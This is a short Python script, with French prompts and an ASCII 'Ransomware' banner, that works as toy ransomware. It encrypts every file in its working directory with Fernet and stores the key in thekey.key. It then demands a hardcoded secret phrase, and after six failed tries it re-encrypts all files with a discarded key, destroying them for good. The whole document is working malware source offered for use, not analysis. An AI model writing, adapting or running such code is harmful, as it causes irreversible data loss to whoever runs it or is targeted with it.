import os
from cryptography.fernet import Fernet
from art import *
from termcolor import colored

print(colored(text2art("Ransomware").center(60), 'red'))
global erreur
erreur = 0


def auto_destruction():
    files = []
    boucle = True

    for file in os.listdir():
        if os.path.isfile(file):
            files.append(file)

    key = Fernet.generate_key()


    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
    return 0


def encrypted():
    files = []

    for file in os.listdir():
        if file == "encrypted.py" or file == "thekey.key" :
            continue
        if os.path.isfile(file):
            files.append(file)

    key = Fernet.generate_key()

    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)

def decrypt():
    files = []
    erreur = 0
    dead = False

    for file in os.listdir():
        if file == "encrypted.py" or file == "thekey.key" or file == "decrypt.py":
            continue

        if os.path.isfile(file):
            files.append(file)


    with open("thekey.key", "rb") as key:
        secretkey = key.read()

    secretphrase = "ransomware"
    debut = True

    user_phrase = ""
    while not secretphrase == user_phrase or dead:
        if user_phrase != secretphrase and debut == False:
            print("Recommence")
            erreur += 1
            print("Tu a utilisée  ", erreur, " sur 6")
        if erreur < 6:
            user_phrase = input("Entrer la phrase secrete pour retrouver vos données")
            debut = False
        else:
            print("Vous n'avez plus aucune chance de retrouvé vos données")
            dead=True
            auto_destruction()

    if user_phrase == secretphrase:
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
encrypted()
decrypt()
